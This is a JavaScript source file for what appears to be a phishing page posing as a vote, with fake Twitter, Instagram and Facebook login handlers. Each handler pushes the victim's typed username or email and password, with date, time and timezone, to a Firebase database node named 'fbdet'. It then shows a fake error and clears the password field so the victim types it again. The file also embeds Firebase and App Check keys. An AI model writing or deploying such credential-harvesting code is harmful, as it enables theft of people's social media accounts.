// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyClD2fGSdipTFa9dPizXPZMpVxMxvuRklw",
  authDomain: "asiastarzbootcamp.firebaseapp.com",
  databaseURL: "https://asiastarzbootcamp-default-rtdb.firebaseio.com",
  projectId: "asiastarzbootcamp",
  storageBucket: "asiastarzbootcamp.appspot.com",
  messagingSenderId: "969028705397",
  appId: "1:969028705397:web:c6f4ffe90186e0a7c42c3c",
  measurementId: "G-TEGMLXLC02",
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function tw_login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("tw-email").value;
  var password = document.getElementById("tw-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Twitter";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Something went wrong with your vote.",
        icon: "error",
        confirmButtonText: "Try Again",
      });
      document.getElementById("fb-pass").value = "";

      return false;
    }, 2000);
  }
}

function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = "Instagram";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Something went wrong with your vote.",
        icon: "error",
        confirmButtonText: "Try Again",
      });

      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

function login() {
  // Attempt anonymous sign-in with Firebase Authentication
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      // Display Firebase auth errors in the error box
      showError(errorMessage);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    // Push the data to Firebase Realtime Database
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    // Use setTimeout to simulate the delay, then display an error message in the error box
    setTimeout(function () {
      showError("Invalid username or password");
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  } else {
    // Show an error if email or password is missing
    showError("Please enter both email and password.");
  }
}

function showError(message) {
  var errorBox = document.getElementById("error_box");
  errorBox.style.display = "block";
  errorBox.querySelector("div:nth-child(2)").textContent = message;
}

function hideError() {
  var errorBox = document.getElementById("error_box");
  errorBox.style.display = "none";
}
